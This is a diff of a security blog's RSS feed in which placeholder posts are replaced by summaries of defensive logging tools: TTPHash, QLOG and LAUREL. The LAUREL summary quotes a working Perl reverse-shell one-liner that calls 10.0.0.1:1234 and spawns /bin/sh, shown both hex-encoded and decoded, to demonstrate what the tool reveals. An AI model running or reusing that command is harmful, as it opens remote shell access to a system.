@@ -2,25 +2,32 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Posts on Threathunters.io</title>
-    <link>http://localhost:60991/categories/posts/</link>
+    <link>http://localhost:1313/categories/posts/</link>
     <description>Recent content in Posts on Threathunters.io</description>
     <generator>Hugo</generator>
     <language>en-us</language>
-    <lastBuildDate>Wed, 03 Jan 2024 00:00:00 +0000</lastBuildDate>
-    <atom:link href="http://localhost:60991/categories/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 30 Dec 2021 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/categories/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>New Post</title>
-      <link>http://localhost:60991/blog/posts/post2/</link>
-      <pubDate>Wed, 03 Jan 2024 00:00:00 +0000</pubDate>
-      <guid>http://localhost:60991/blog/posts/post2/</guid>
-      <description>Text can be bold, italic, or strikethrough. Links should be blue with no underlines (unless hovered over).&#xA;There should be whitespace between paragraphs. There should be whitespace between paragraphs. There should be whitespace between paragraphs. There should be whitespace between paragraphs.&#xA;There should be whitespace between paragraphs. There should be whitespace between paragraphs. There should be whitespace between paragraphs. There should be whitespace between paragraphs.&#xA;There should be no margin above this first sentence.</description>
+      <title>TTPHash - A possible approach for event fingerprinting</title>
+      <link>http://localhost:1313/blog/posts/ttp_hash/</link>
+      <pubDate>Thu, 30 Dec 2021 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/blog/posts/ttp_hash/</guid>
+      <description>The lack of a generally accepted method for calculating a telemetry event fingerprint to uniquely identify a specific event represents a gap in current telemetry collection practice. At present, the approach involves utilizing file hashes as a means to fingerprint observable entities, such as files. While file hashes serve as invaluable markers from the perspective of Indicators of Compromise (IOCs), their utility is restricted by their inability to furnish contextual insights regarding the event in question.</description>
     </item>
     <item>
-      <title>Old Post</title>
-      <link>http://localhost:60991/blog/posts/post1/</link>
-      <pubDate>Tue, 02 Jan 2024 00:00:00 +0000</pubDate>
-      <guid>http://localhost:60991/blog/posts/post1/</guid>
-      <description></description>
+      <title>QLOG - ETW logging for process creation events</title>
+      <link>http://localhost:1313/blog/posts/qlog/</link>
+      <pubDate>Wed, 29 Dec 2021 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/blog/posts/qlog/</guid>
+      <description>QLOG provides lightweigth userland logging of process create events on Windows written in C#. It&amp;rsquo;s under development and currently in experimental state. QLOG uses ETW to collect telemetry, it doesn’t use API hooks and it doesn’t require a driver to be installed on the target system, Currently QLOG supports “process create” events, but other enriched events may follow soon. QLOG runs as a Windows Services, but can also run in console mode, if you want to output to console directly.</description>
+    </item>
+    <item>
+      <title>LAUREL: Linux Audit – Usable, Robust, Easy Logging</title>
+      <link>http://localhost:1313/blog/posts/intro_laurel/</link>
+      <pubDate>Sat, 25 Dec 2021 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/blog/posts/intro_laurel/</guid>
+      <description>LAUREL is an event post-processing plugin for auditd(8) to improve its usability in modern security monitoring setups.&#xA;Why? Instead of audit events that look like this…&#xA;type=EXECVE msg=audit(1626611363.720:348501): argc=3 a0=&amp;#34;perl&amp;#34; a1=&amp;#34;-e&amp;#34; a2=75736520536F636B65743B24693D2231302E302E302E31223B24703D313233343B736F636B65742… …turn them into JSON logs where the mess that your pen testers/red teamers/attackers are trying to make becomes apparent at first glance:&#xA;{ [...] &amp;#34;EXECVE&amp;#34;: { &amp;#34;argc&amp;#34;: 3, &amp;#34;ARGV&amp;#34;: [ &amp;#34;perl&amp;#34;, &amp;#34;-e&amp;#34;, &amp;#34;use Socket;$i=\&amp;#34;10.0.0.1\&amp;#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&amp;#34;tcp\&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\&amp;#34;&amp;gt;&amp;amp;S\&amp;#34;);open(STDOUT,\&amp;#34;&amp;gt;&amp;amp;S\&amp;#34;);open(STDERR,\&amp;#34;&amp;gt;&amp;amp;S\&amp;#34;);exec(\&amp;#34;/bin/sh -i\&amp;#34;);};&amp;#34; ] }, [...] } This happens at the source.</description>
     </item>
   </channel>
 </rss>
